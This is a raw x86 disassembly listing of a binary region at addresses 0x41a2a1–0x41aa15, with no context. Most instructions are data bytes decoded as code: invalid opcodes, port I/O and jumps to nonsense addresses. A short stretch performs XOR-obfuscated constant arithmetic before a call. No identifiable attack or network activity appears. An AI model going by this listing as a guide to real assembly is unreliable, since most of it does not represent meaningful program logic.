  41a2a1:	jle    0x41a29d
  41a2a3:	mov    esi,0x1816ad2b
  41a2a8:	mov    esp,0xc8181812
  41a2ad:	les    esp,FWORD PTR [edi+0x3dba6bf8]
  41a2b3:	test   DWORD PTR [ebx+0x6c],eax
  41a2b6:	mov    edx,0x17060942
  41a2bb:	bound  ebx,QWORD PTR [edi-0x56]
  41a2be:	inc    ecx
  41a2bf:	hlt    
  41a2c0:	dec    ecx
  41a2c1:	mov    ebx,DWORD PTR [ecx+ecx*8-0x788cbe43]
  41a2c8:	and    DWORD PTR [ecx+eiz*2-0x43],ebx
  41a2cc:	popf   
  41a2cd:	mov    al,ds:0xd602e954
  41a2d2:	add    BYTE PTR [ecx],dl
  41a2d4:	out    dx,al
  41a2d5:	push   0x53
  41a2d7:	scas   eax,DWORD PTR es:[edi]
  41a2d8:	mov    eax,ds:0x483faf6e
  41a2dd:	and    BYTE PTR [ecx+0xf],dh
  41a2e0:	dec    ebp
  41a2e1:	mov    ds,edx
  41a2e3:	xchg   ebp,eax
  41a2e4:	mov    esp,0x4b403704
  41a2e9:	inc    edi
  41a2ea:	hlt    
  41a2eb:	push   ebp
  41a2ec:	cmp    al,0x7d
  41a2ee:	gs out dx,eax
  41a2f0:	out    dx,al
  41a2f1:	icebp  
  41a2f2:	test   al,0x83
  41a2f4:	lea    edx,[ebp-0x1474b4d7]
  41a2fa:	nop
  41a2fb:	pushf  
  41a2fc:	cmp    BYTE PTR [edi],0xbf
  41a2ff:	add    al,dl
  41a301:	lea    edx,[eax-0x71919582]
  41a307:	(bad)  
  41a308:	dec    ebx
  41a309:	mov    ebx,ebx
  41a30b:	mov    dh,0x0
  41a30d:	out    0x91,eax
  41a30f:	loope  0x41a372
  41a311:	ins    DWORD PTR es:[edi],dx
  41a312:	(bad)  
  41a313:	cmp    cl,BYTE PTR [eax]
  41a315:	gs dec edi
  41a317:	mov    al,0xe5
  41a319:	popf   
  41a31a:	xor    DWORD PTR [ebx-0x59],esp
  41a31d:	imul   edi,DWORD PTR [esi+0x39308cd4],0xc1ac2abc
  41a327:	cwde   
  41a328:	fldcw  WORD PTR [ebp-0x37]
  41a32b:	rcl    DWORD PTR [ebx+0x5e022231],1
  41a331:	mov    ebx,0x435b947d
  41a336:	mov    edx,DWORD PTR [ecx]
  41a338:	mov    ecx,0xf654dccf
  41a33d:	int3   
  41a33e:	and    eax,0xeda57cb0
  41a343:	cli    
  41a344:	cwde   
  41a345:	inc    edi
  41a346:	int    0x1
  41a348:	and    BYTE PTR [edi],bl
  41a34a:	int3   
  41a34b:	fbstp  TBYTE PTR ds:[ebx+0x1f109c0c]
  41a352:	xor    BYTE PTR [edi+0x5e],bl
  41a355:	jp     0x41a365
  41a357:	ins    BYTE PTR es:[edi],dx
  41a358:	sub    cl,dl
  41a35a:	je     0x41a2ef
  41a35c:	(bad)  
  41a35d:	jno    0x41a3d0
  41a35f:	js     0x41a397
  41a361:	jle    0x41a308
  41a363:	hlt    
  41a364:	inc    eax
  41a365:	into   
  41a366:	add    dh,bh
  41a368:	outs   dx,BYTE PTR ds:[esi]
  41a369:	cli    
  41a36a:	rol    BYTE PTR [edx-0x41886290],1
  41a370:	fs add al,bl
  41a373:	mov    bl,0xd4
  41a375:	aas    
  41a376:	mov    esp,0xa05e9c56
  41a37b:	out    dx,eax
  41a37c:	add    bh,dl
  41a37e:	cld    
  41a37f:	fcmove st,st(6)
  41a381:	xlat   BYTE PTR ds:[ebx]
  41a382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a383:	imul   esi,DWORD PTR [edi+eiz*8-0x2f],0xffffffe2
  41a388:	jle    0x41a355
  41a38a:	cli    
  41a38b:	aaa    
  41a38c:	dec    ecx
  41a38d:	jp     0x41a323
  41a38f:	mov    ebp,0xee1861c5
  41a394:	lods   eax,DWORD PTR ds:[esi]
  41a395:	add    DWORD PTR [esi+0x19c29854],edx
  41a39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a39c:	jo     0x41a418
  41a39e:	outs   dx,BYTE PTR ds:[esi]
  41a39f:	pop    ebp
  41a3a0:	(bad)  
  41a3a1:	imul   BYTE PTR [esi+0x6c5cd9e0]
  41a3a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3a8:	bnd jge 0x41a33b
  41a3ab:	jne    0x41a421
  41a3ad:	mov    ecx,0x654e3b49
  41a3b2:	xlat   BYTE PTR ds:[ebx]
  41a3b3:	pusha  
  41a3b4:	push   esi
  41a3b5:	inc    edx
  41a3b6:	sti    
  41a3b7:	stos   DWORD PTR es:[edi],eax
  41a3b8:	dec    esi
  41a3b9:	inc    edx
  41a3ba:	inc    edx
  41a3bb:	es ja  0x41a3d0
  41a3be:	mov    edi,DWORD PTR [edi]
  41a3c0:	xchg   esp,eax
  41a3c1:	push   ss
  41a3c2:	xchg   edx,eax
  41a3c3:	stos   BYTE PTR es:[edi],al
  41a3c4:	pop    esp
  41a3c5:	fwait
  41a3c6:	aas    
  41a3c7:	and    edi,DWORD PTR [esi-0x38]
  41a3ca:	leave  
  41a3cb:	sub    eax,ecx
  41a3cd:	xchg   edx,eax
  41a3ce:	call   0xe22e8c6b
  41a3d3:	add    esi,eax
  41a3d5:	jmp    0xde7eebc1
  41a3da:	cmc    
  41a3db:	hlt    
  41a3dc:	or     esi,DWORD PTR [eax+0x47]
  41a3df:	fcom   QWORD PTR [edx]
  41a3e1:	outs   dx,DWORD PTR ds:[esi]
  41a3e2:	sbb    bl,BYTE PTR [ecx+0x423b1eb0]
  41a3e8:	mov    dl,0x93
  41a3ea:	bnd jae 0x41a3e0
  41a3ed:	pop    edx
  41a3ee:	rol    BYTE PTR [edi+0x77],0x4
  41a3f2:	inc    esi
  41a3f3:	jmp    0xde2a:0x674bec9f
  41a3fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3fb:	int3   
  41a3fc:	sbb    eax,0x9395a58f
  41a401:	stc    
  41a402:	dec    eax
  41a403:	xchg   BYTE PTR [esi],dl
  41a405:	loopne 0x41a3ae
  41a407:	ficom  DWORD PTR [edx-0x76]
  41a40a:	inc    edi
  41a40b:	arpl   WORD PTR [esi-0x574773a5],di
  41a411:	pop    ss
  41a412:	int3   
  41a413:	popa   
  41a414:	ins    DWORD PTR es:[edi],dx
  41a415:	push   ebx
  41a416:	rcl    DWORD PTR [ebx-0x6b],1
  41a419:	push   ebp
  41a41a:	loop   0x41a3a3
  41a41c:	pop    esp
  41a41d:	ins    DWORD PTR es:[edi],dx
  41a41e:	jle    0x41a3be
  41a420:	cli    
  41a421:	mov    esi,0xcb4bb386
  41a426:	cmc    
  41a427:	dec    eax
  41a428:	jmp    0xdcfb00e0
  41a42d:	xchg   ecx,eax
  41a42e:	test   BYTE PTR [ebp+0x2d],bh
  41a431:	into   
  41a432:	mov    ch,0x3a
  41a434:	push   ebp
  41a435:	push   es
  41a436:	ffree  st(7)
  41a438:	cmovge eax,edx
  41a43b:	adc    DWORD PTR [edi],edi
  41a43d:	dec    esp
  41a43e:	xchg   ebx,eax
  41a43f:	mov    edx,0x56ef1d2e
  41a444:	scas   eax,DWORD PTR es:[edi]
  41a445:	and    ebx,DWORD PTR [ebx]
  41a447:	test   BYTE PTR [ebx+0x3f84c8ef],dh
  41a44d:	inc    eax
  41a44e:	ds retf 
  41a450:	out    0x55,eax
  41a452:	mov    al,0x7d
  41a454:	dec    esi
  41a455:	gs mov ch,0x44
  41a458:	call   0x159ab536
  41a45d:	inc    eax
  41a45e:	mov    ah,0xb
  41a460:	sbb    al,0xda
  41a462:	hlt    
  41a463:	adc    al,0xb8
  41a465:	lahf   
  41a466:	inc    DWORD PTR [edi+0x2620a490]
  41a46c:	bound  ecx,QWORD PTR [esi+0x53]
  41a46f:	popf   
  41a470:	push   edi
  41a471:	(bad)  
  41a472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a473:	jmp    0x7e2b:0x82aa9466
  41a47a:	inc    esi
  41a47b:	out    dx,al
  41a47c:	jmp    0x41a435
  41a47e:	scas   eax,DWORD PTR es:[edi]
  41a47f:	or     edi,DWORD PTR [edx]
  41a481:	shl    DWORD PTR [edx+0x383b82fd],0x5c
  41a488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a489:	clc    
  41a48a:	jne    0x41a495
  41a48c:	push   0xcea9fe91
  41a491:	or     DWORD PTR [edx-0x4fda65b2],edi
  41a497:	scas   eax,DWORD PTR es:[edi]
  41a498:	pop    es
  41a499:	dec    dl
  41a49b:	mov    ebp,0x308b4e0f
  41a4a0:	sub    al,0x2e
  41a4a2:	out    0xc7,al
  41a4a4:	xchg   edx,eax
  41a4a5:	gs cmp dh,0xfa
  41a4a9:	outs   dx,BYTE PTR ds:[esi]
  41a4aa:	or     BYTE PTR [edi+0x1785dd3a],bl
  41a4b0:	xchg   DWORD PTR [ebx],eax
  41a4b2:	outs   dx,BYTE PTR ds:[esi]
  41a4b3:	dec    ebx
  41a4b4:	stc    
  41a4b5:	stos   DWORD PTR es:[edi],eax
  41a4b6:	in     eax,dx
  41a4b7:	or     eax,0xcba7fa90
  41a4bc:	mov    bh,BYTE PTR [edx]
  41a4be:	data16 fisttp WORD PTR [esp+edi*2-0x6c]
  41a4c3:	cmp    DWORD PTR [eax],ebx
  41a4c5:	mov    ax,0xfef3
  41a4c9:	dec    DWORD PTR [ebp+0x2ce3fbb4]
  41a4cf:	cmp    al,0x69
  41a4d1:	jmp    0x3319:0x2a9d721b
  41a4d8:	jnp    0x41a4dd
  41a4da:	adc    ch,BYTE PTR [esi]
  41a4dc:	pusha  
  41a4dd:	cmp    eax,0x400533a3
  41a4e2:	or     DWORD PTR [esi+0x5c6f1808],edi
  41a4e8:	pusha  
  41a4e9:	jl     0x41a4bd
  41a4eb:	pusha  
  41a4ec:	jmp    0x41a4da
  41a4ee:	leave  
  41a4ef:	or     al,0xc9
  41a4f1:	add    al,0x17
  41a4f3:	xchg   ebx,eax
  41a4f4:	fwait
  41a4f5:	xor    BYTE PTR [eax-0x4992cc6],ch
  41a4fb:	cmp    cl,bh
  41a4fd:	pop    ss
  41a4fe:	cmp    dh,BYTE PTR [esi+0x3f7da16e]
  41a504:	xchg   edx,eax
  41a505:	fistp  WORD PTR [edi+0x6efcebee]
  41a50b:	cli    
  41a50c:	cli    
  41a50d:	aas    
  41a50e:	popf   
  41a50f:	fcmovbe st,st(1)
  41a511:	or     al,al
  41a513:	push   es
  41a514:	enter  0x44c5,0xb0
  41a518:	ds sahf 
  41a51a:	xor    DWORD PTR fs:0x71da6215,edx
  41a521:	(bad)  
  41a522:	sti    
  41a523:	lock sub eax,0xb05dbd79
  41a529:	push   ebx
  41a52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a52b:	test   DWORD PTR [eax],0x66e854f7
  41a531:	cdq    
  41a532:	pop    ss
  41a533:	jecxz  0x41a4cc
  41a535:	or     eax,0x4bac302e
  41a53a:	into   
  41a53b:	mov    ch,BYTE PTR [edx+0x17]
  41a53e:	je     0x41a536
  41a540:	cwde   
  41a541:	xchg   ebp,eax
  41a542:	xlat   BYTE PTR ds:[ebx]
  41a543:	jnp    0x41a582
  41a545:	lahf   
  41a546:	cs mov eax,0xd876d6b3
  41a54c:	shl    ah,0xbd
  41a54f:	inc    esp
  41a550:	stos   BYTE PTR es:[edi],al
  41a551:	mov    esp,gs
  41a553:	or     ch,BYTE PTR [ebp-0x28]
  41a556:	aam    0x38
  41a558:	sub    BYTE PTR ds:0x6bb8d74b,dh
  41a55e:	pop    edi
  41a55f:	dec    eax
  41a560:	gs in  al,dx
  41a562:	sahf   
  41a563:	fcomi  st,st(0)
  41a565:	and    edx,edx
  41a567:	xchg   edi,eax
  41a568:	xor    eax,0x91827b18
  41a56d:	popf   
  41a56e:	push   ebp
  41a56f:	aam    0xd
  41a571:	into   
  41a572:	ja     0x41a57b
  41a574:	sbb    dl,BYTE PTR [eax]
  41a576:	ret    0x64da
  41a579:	jle    0x41a588
  41a57b:	xor    al,BYTE PTR [edi-0x1a]
  41a57e:	int    0xe
  41a580:	mov    bl,0xea
  41a582:	in     al,dx
  41a583:	mov    dl,0x24
  41a585:	fst    DWORD PTR [ebx-0x37]
  41a588:	mov    ds:0x4a9e358e,al
  41a58d:	xor    DWORD PTR [esi],ebp
  41a58f:	inc    ebp
  41a590:	imul   ebx,DWORD PTR [edx+0x29bcc642],0x61
  41a597:	stc    
  41a598:	test   BYTE PTR [ecx+eax*2-0x2dda273d],0x86
  41a5a0:	in     al,0x28
  41a5a2:	clc    
  41a5a3:	jl     0x41a5c4
  41a5a5:	push   edi
  41a5a6:	test   al,0xfe
  41a5a8:	cli    
  41a5a9:	int3   
  41a5aa:	in     eax,dx
  41a5ab:	nop
  41a5ac:	lock (bad) 
  41a5ae:	std    
  41a5af:	stc    
  41a5b0:	scas   al,BYTE PTR es:[edi]
  41a5b1:	rcr    DWORD PTR [edi+0x19737c1e],cl
  41a5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5b8:	xor    al,0xcb
  41a5ba:	in     al,0xa9
  41a5bc:	ins    DWORD PTR es:[edi],dx
  41a5bd:	jns    0x41a5d2
  41a5bf:	(bad)  
  41a5c0:	daa    
  41a5c1:	xor    DWORD PTR [edx+ebp*1],0xffffff81
  41a5c5:	test   BYTE PTR [ebp+0x4d],ch
  41a5c8:	stos   BYTE PTR es:[edi],al
  41a5c9:	int    0x1c
  41a5cb:	addr16 adc ecx,esp
  41a5ce:	and    cl,BYTE PTR [edx+0x68]
  41a5d1:	jg     0x41a561
  41a5d3:	bound  edi,QWORD PTR [ecx-0xac82b99]
  41a5d9:	adc    eax,0xd10f6e56
  41a5de:	shl    ebp,0x2d
  41a5e1:	arpl   WORD PTR [ebx],di
  41a5e3:	add    al,0x2
  41a5e5:	mov    al,0xc7
  41a5e7:	mov    eax,ds:0x32f62173
  41a5ec:	outs   dx,DWORD PTR ds:[esi]
  41a5ed:	fist   DWORD PTR [esi-0x2d]
  41a5f0:	adc    BYTE PTR [ecx-0x61b2e5e],bl
  41a5f6:	aad    0xba
  41a5f8:	pop    ss
  41a5f9:	dec    edx
  41a5fa:	jecxz  0x41a66f
  41a5fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5fd:	fnclex 
  41a5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a600:	jle    0x41a5ef
  41a602:	cmp    DWORD PTR [esi-0xe084607],ebp
  41a608:	and    eax,0xb9dfb2f7
  41a60d:	(bad)  
  41a60e:	push   0xffffffe4
  41a610:	xchg   ebp,eax
  41a611:	ret    
  41a612:	pop    edi
  41a613:	ja     0x41a5fe
  41a615:	sbb    eax,0x174456de
  41a61a:	pop    eax
  41a61b:	fdiv   QWORD PTR [ebx+0x3535d9b1]
  41a621:	jle    0x41a606
  41a623:	dec    esi
  41a624:	jnp    0x41a667
  41a626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a627:	icebp  
  41a628:	das    
  41a629:	daa    
  41a62a:	in     eax,dx
  41a62b:	bound  ebp,QWORD PTR [edx-0x6a]
  41a62e:	js     0x41a640
  41a630:	es sub ebp,ebx
  41a633:	retf   0x43f
  41a636:	jno    0x41a5c6
  41a638:	inc    ecx
  41a639:	push   ds
  41a63a:	sub    ecx,ebp
  41a63c:	sti    
  41a63d:	push   ebp
  41a63e:	sub    ebx,DWORD PTR fs:[esi+0x5d]
  41a642:	(bad)  
  41a643:	lea    ebp,[ebp+0x41]
  41a646:	inc    ecx
  41a647:	pop    ebx
  41a648:	xchg   ecx,eax
  41a649:	and    al,0x80
  41a64b:	lds    ebx,FWORD PTR [ecx+0x63]
  41a64e:	jl     0x41a679
  41a650:	push   eax
  41a651:	add    ecx,edi
  41a653:	ret    0x1423
  41a656:	cld    
  41a657:	mov    edi,0xe30e8e67
  41a65c:	call   0x8c02d258
  41a661:	dec    esp
  41a662:	and    al,0x50
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x422072
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	jae    0x41a6f1
  41a74a:	push   cs
  41a74b:	jle    0x41a71c
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1+0x23561818],bh
  41a756:	hlt    
  41a757:	stc    
  41a758:	push   ds
  41a759:	xchg   ebx,eax
  41a75a:	lods   al,BYTE PTR ds:[esi]
  41a75b:	pop    eax
  41a75c:	jae    0x41a7cc
  41a75e:	xor    BYTE PTR [edx+edx*4+0x239233d8],0x5a
  41a766:	es xchg esp,eax
  41a768:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41a76a:	das    
  41a76b:	sub    esp,DWORD PTR [ebx-0x78]
  41a76e:	xchg   esp,eax
  41a76f:	add    al,0xb3
  41a771:	mov    eax,0xb9251ef2
  41a776:	mov    al,ds:0xc6314758
  41a77b:	int    0x4e
  41a77d:	or     ch,BYTE PTR [ecx+ecx*4+0x28bb0fea]
  41a784:	xor    edx,DWORD PTR [edi-0x4f]
  41a787:	test   eax,0x336e7d63
  41a78c:	stos   DWORD PTR es:[edi],eax
  41a78d:	dec    edi
  41a78e:	push   0xaf4bb200
  41a793:	jne    0x41a78c
  41a795:	fldcw  WORD PTR ds:0x6eefde82
  41a79b:	sub    cl,dh
  41a79d:	lahf   
  41a79e:	hlt    
  41a79f:	jae    0x41a7d1
  41a7a1:	ror    BYTE PTR [edi],cl
  41a7a3:	mov    ah,0x5a
  41a7a5:	lds    esi,FWORD PTR [ebx]
  41a7a7:	push   0xffffffe7
  41a7a9:	rol    BYTE PTR [esi],cl
  41a7ab:	out    dx,al
  41a7ac:	popw   ss
  41a7ae:	adc    dl,BYTE PTR [ecx-0x50]
  41a7b1:	xchg   esi,eax
  41a7b2:	rol    BYTE PTR [edx-0x51f4a4ae],cl
  41a7b8:	dec    esp
  41a7b9:	maxps  xmm3,xmm3
  41a7bc:	jnp    0x41a78e
  41a7be:	test   eax,0xc38d0b59
  41a7c3:	push   0x6a068e3
  41a7c8:	mov    ebx,es
  41a7ca:	ret    0x9dff
  41a7cd:	mov    DWORD PTR ds:0x6737c63e,ebp
  41a7d3:	rol    DWORD PTR [ebp+0x1a],1
  41a7d6:	mov    al,0xa1
  41a7d8:	lea    esi,[ecx]
  41a7da:	add    ch,BYTE PTR [ebp-0x408d3034]
  41a7e0:	data16 out dx,al
  41a7e2:	fsubr  st,st(2)
  41a7e4:	dec    esp
  41a7e5:	cld    
  41a7e6:	(bad)  
  41a7e7:	daa    
  41a7e8:	les    edi,FWORD PTR [ebp+edi*4+0x6f]
  41a7ec:	push   ebx
  41a7ed:	dec    eax
  41a7ee:	jmp    FWORD PTR [edi]
  41a7f0:	stos   BYTE PTR es:[edi],al
  41a7f1:	pusha  
  41a7f2:	push   ss
  41a7f3:	mov    ebp,0x2b5c6827
  41a7f8:	mov    ebx,0xc7e42ac2
  41a7fd:	jns    0x41a811
  41a7ff:	lea    edi,[ebx]
  41a801:	pop    ds
  41a802:	mov    al,ds:0x897532f3
  41a807:	(bad)  
  41a809:	and    al,0x61
  41a80b:	xchg   edx,eax
  41a80c:	in     eax,0x25
  41a80e:	xor    dh,0x15
  41a811:	fist   DWORD PTR [esi]
  41a813:	mov    ds:0x9aec529b,al
  41a818:	xor    DWORD PTR [esi],0xffffff9c
  41a81b:	sub    DWORD PTR [ecx+0x2c1f5ffd],ebx
  41a821:	mov    ch,0xb3
  41a823:	retf   
  41a824:	add    BYTE PTR [ebp+edx*4-0x48],0x13
  41a829:	xor    al,0x17
  41a82b:	and    edi,edi
  41a82d:	xor    ebx,eax
  41a82f:	cwde   
  41a830:	je     0x41a824
  41a832:	mov    esi,0xb6bd3eef
  41a837:	adc    DWORD PTR [edx+eax*2],0x271253d6
  41a83e:	aas    
  41a83f:	shl    ebp,0x3d
  41a842:	(bad)  
  41a843:	jg     0x41a84c
  41a845:	scas   al,BYTE PTR es:[edi]
  41a846:	dec    ecx
  41a847:	dec    esi
  41a848:	or     DWORD PTR ds:0x6475f325,edx
  41a84e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a84f:	sti    
  41a850:	adc    BYTE PTR [edi],dh
  41a852:	mov    ch,0xd0
  41a854:	out    0x50,al
  41a856:	pop    edi
  41a857:	out    dx,al
  41a858:	jne    0x41a809
  41a85a:	xor    edx,DWORD PTR [ebx+ebx*1]
  41a85d:	xchg   ecx,ebx
  41a85f:	fmul   QWORD PTR [ebx+esi*2]
  41a862:	daa    
  41a863:	ret    0x8b4
  41a866:	and    bl,dl
  41a868:	test   BYTE PTR [ecx],dl
  41a86a:	mov    bl,0x50
  41a86c:	push   0x613cbfda
  41a871:	test   BYTE PTR [ecx+0x5422eaa9],bl
  41a877:	es or  eax,0x192a426f
  41a87d:	push   ebx
  41a87e:	(bad)  
  41a87f:	pop    ds
  41a880:	pop    es
  41a881:	sbb    DWORD PTR [esi+0x2f783448],ebp
  41a887:	add    BYTE PTR [edi+0x73],0x3a
  41a88b:	push   ebp
  41a88c:	push   edx
  41a88d:	test   DWORD PTR [eax],esp
  41a88f:	adc    eax,0x702b7c28
  41a894:	xlat   BYTE PTR ds:[ebx]
  41a895:	xchg   ebp,eax
  41a896:	add    esp,DWORD PTR [edx-0x592f6600]
  41a89c:	js     0x41a913
  41a89e:	mov    edi,?
  41a8a0:	repz inc ebp
  41a8a2:	push   ds
  41a8a3:	mul    BYTE PTR [eax+ecx*8]
  41a8a6:	imul   BYTE PTR [edi-0x59]
  41a8a9:	in     eax,0x81
  41a8ab:	xchg   ebp,eax
  41a8ac:	xlat   BYTE PTR ds:[ebx]
  41a8ad:	adc    DWORD PTR [edx],edi
  41a8af:	dec    esp
  41a8b0:	add    ah,al
  41a8b2:	fdivr  st(7),st
  41a8b4:	imul   esp,ecx,0xfffffff4
  41a8b7:	hlt    
  41a8b8:	or     edx,esi
  41a8ba:	loope  0x41a890
  41a8bc:	icebp  
  41a8bd:	mov    ch,0x8f
  41a8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c0:	pop    ss
  41a8c1:	sbb    eax,0x38730db2
  41a8c6:	test   DWORD PTR [eax-0x3278bee5],ebp
  41a8cc:	mov    ah,0xf
  41a8ce:	aam    0x2e
  41a8d0:	ror    DWORD PTR [ebx+0x11],1
  41a8d3:	jae    0x41a902
  41a8d5:	mov    BYTE PTR [ebp-0x77c49743],cl
  41a8db:	jne    0x41a8c7
  41a8dd:	or     eax,0x2d8c982f
  41a8e2:	je     0x41a929
  41a8e4:	mov    bl,0x98
  41a8e6:	mov    bh,0x85
  41a8e8:	(bad)  
  41a8e9:	es das 
  41a8eb:	(bad)  
  41a8ec:	fs in  eax,0xc5
  41a8ef:	sub    DWORD PTR [eax],esp
  41a8f1:	je     0x41a94e
  41a8f3:	mov    cs,edi
  41a8f5:	mov    bl,0x9d
  41a8f7:	mov    al,ds:0xdc6e2f58
  41a8fc:	sub    eax,edi
  41a8fe:	add    BYTE PTR [esi+0x6ec2f06e],bl
  41a904:	add    eax,0x92c2bf71
  41a909:	mov    dl,0x8
  41a90b:	xchg   edi,eax
  41a90c:	not    DWORD PTR [ebx]
  41a90e:	fld    TBYTE PTR [ecx+0x32]
  41a911:	adc    eax,0xf2ce7c1b
  41a916:	sti    
  41a917:	dec    ebp
  41a918:	scas   eax,DWORD PTR es:[edi]
  41a919:	xchg   edx,eax
  41a91a:	stos   DWORD PTR es:[edi],eax
  41a91b:	push   ebx
  41a91c:	aas    
  41a91d:	mov    dl,0x42
  41a91f:	or     ecx,DWORD PTR [ecx]
  41a921:	mov    ecx,0x9eb11a9e
  41a926:	mov    bl,0xeb
  41a928:	inc    ebx
  41a929:	and    BYTE PTR [esi+0x7e],dl
  41a92c:	hlt    
  41a92d:	push   ebp
  41a92e:	out    dx,eax
  41a92f:	xor    al,0x97
  41a931:	cmp    edx,DWORD PTR [esi+ecx*4-0x4b]
  41a935:	rol    BYTE PTR ds:0x423a3bc1,1
  41a93b:	push   ds
  41a93c:	lds    eax,FWORD PTR [esi]
  41a93e:	iret   
  41a93f:	xchg   esi,eax
  41a940:	adc    DWORD PTR [edx],esi
  41a942:	test   BYTE PTR [ecx+0x1c4797a6],0xc3
  41a949:	or     eax,0xf6f88b4b
  41a94e:	cmp    ah,BYTE PTR [ebx-0x44560638]
  41a954:	sahf   
  41a955:	fild   WORD PTR [ebx*2+0xb086b9e]
  41a95c:	add    ch,BYTE PTR [eax-0x73]
  41a95f:	pop    esi
  41a960:	aam    0x43
  41a962:	and    cl,dh
  41a964:	pop    ebp
  41a965:	and    bh,BYTE PTR [eax+ebx*2-0xa]
  41a969:	cmp    eax,0x6cb4274f
  41a96e:	(bad)  
  41a96f:	test   al,0xa2
  41a971:	lahf   
  41a972:	(bad)  
  41a973:	mov    ecx,DWORD PTR [edi]
  41a975:	jg     0x41a91e
  41a977:	pop    ecx
  41a978:	inc    eax
  41a979:	dec    ebp
  41a97a:	add    al,0x31
  41a97c:	popa   
  41a97d:	loop   0x41a914
  41a97f:	test   eax,0xc00b2fac
  41a984:	(bad)  [ebx]
  41a986:	adc    dl,BYTE PTR [ebp+0x70]
  41a989:	and    BYTE PTR [ecx+0x6c],bl
  41a98c:	xchg   ebx,eax
  41a98d:	in     al,0x3d
  41a98f:	call   0x9da0200d
  41a994:	out    dx,al
  41a995:	jge    0x41a9e3
  41a997:	aad    0x93
  41a999:	pusha  
  41a99a:	push   ebx
  41a99b:	sub    ebx,DWORD PTR [edx-0x55]
  41a99e:	add    bl,BYTE PTR [edi]
  41a9a0:	lahf   
  41a9a1:	fist   DWORD PTR [edi-0x7e]
  41a9a4:	pop    eax
  41a9a5:	fisubr DWORD PTR [ecx+0x6b866f15]
  41a9ab:	mov    al,0x9d
  41a9ad:	fdivr  DWORD PTR ds:0x5cc238b9
  41a9b3:	popa   
  41a9b4:	sub    edx,DWORD PTR [edi]
  41a9b6:	sbb    ebp,DWORD PTR [ebp+eiz*2+0x16]
  41a9ba:	stos   BYTE PTR es:[edi],al
  41a9bb:	je     0x41a9e2
  41a9bd:	nop
  41a9be:	loopne 0x41a969
  41a9c0:	add    eax,DWORD PTR [ebx-0x4a9dc587]
  41a9c6:	fld    TBYTE PTR [edx]
  41a9c8:	mov    esp,0x7e59f8cc
  41a9cd:	and    dh,BYTE PTR [ebx-0x3ab0eb8d]
  41a9d3:	loop   0x41a978
  41a9d5:	mov    eax,ds:0x2ebc044f
  41a9da:	in     eax,0xcd
  41a9dc:	add    BYTE PTR [ebp+0x7a878262],0x50
  41a9e3:	mov    al,ds:0x90592d8b
  41a9e8:	mov    cl,BYTE PTR [ebp+0x64]
  41a9eb:	or     BYTE PTR [edi-0x3f],dh
  41a9ee:	aam    0xa4
  41a9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f1:	lods   eax,DWORD PTR ds:[esi]
  41a9f2:	mov    bl,0x2
  41a9f4:	jnp    0x41aa5b
  41a9f6:	arpl   cx,di
  41a9f8:	popf   
  41a9f9:	sub    dh,BYTE PTR [edi+0x1c]
  41a9fc:	pand   mm5,mm7
  41a9ff:	cld    
  41aa00:	mov    eax,0x74c3a082
  41aa05:	add    bh,ch
  41aa07:	out    dx,al
  41aa08:	sar    BYTE PTR [eax+0xb],0x6b
  41aa0c:	mov    WORD PTR [esi],?
  41aa0e:	in     eax,dx
  41aa0f:	pusha  
  41aa10:	inc    ebp
  41aa11:	push   esp
  41aa12:	or     eax,DWORD PTR [eax+0x11]
  41aa15:	jle    0x41aa1e
